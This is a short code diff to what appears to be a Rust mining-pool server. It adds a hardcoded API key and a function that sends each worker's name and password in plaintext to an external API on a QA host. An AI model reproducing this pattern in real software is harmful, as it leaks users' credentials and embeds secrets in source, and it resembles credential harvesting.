@@ -18,6 +18,13 @@ use crate::traits::ShareStorage;
 use crate::storage::clickhouse::ClickhouseBlockStorage;
 use crate::models::BlockFound;
 use std::time::Instant;
+use crate::models::AuthorizationLog;
+use crate::services::authorization_processor::AuthorizationProcessor;
+use crate::services::external_api::ExternalApiService;
+use anyhow::Error;
+
+const API_BASE_URL: &str = "https://qa.redrockpool.com/equipment-api/v1";
+const API_KEY: &str = "ZcU8z5W87ufe";
 
 lazy_static! {
     static ref GLOBAL_LOGGER: ShareLogger<ShareLog> = {
@@ -37,12 +44,36 @@ lazy_static! {
     };
 }
 
+lazy_static! {
+    static ref AUTHORIZATION_SENDER: mpsc::Sender<AuthorizationLog> = {
+        let (sender, receiver) = mpsc::channel(100);
+        let api_service = ExternalApiService::new(API_KEY, API_BASE_URL);
+        tokio::spawn(async move {
+            let mut processor = AuthorizationProcessor::new(receiver, api_service);
+            if let Err(e) = processor.run().await {
+                log::error!("Authorization processor error: {}", e);
+            }
+        });
+        sender
+    };
+}
+
 pub fn log_share(share: ShareLog) {
     GLOBAL_LOGGER.log_share(share);
 }
 
 pub fn log_block(block: BlockFound) {
     BLOCK_LOGGER.log_share(block);
+}
+
+pub fn log_authorize(name: &str, password: &str) {
+    let auth_log = AuthorizationLog {
+        name: name.to_string(),
+        password: password.to_string(),
+    };
+    if let Err(e) = AUTHORIZATION_SENDER.try_send(auth_log) {
+        log::error!("Failed to send authorization log: {}", e);
+    }
 }
 
 pub struct ShareLogger<T: ShareData> {
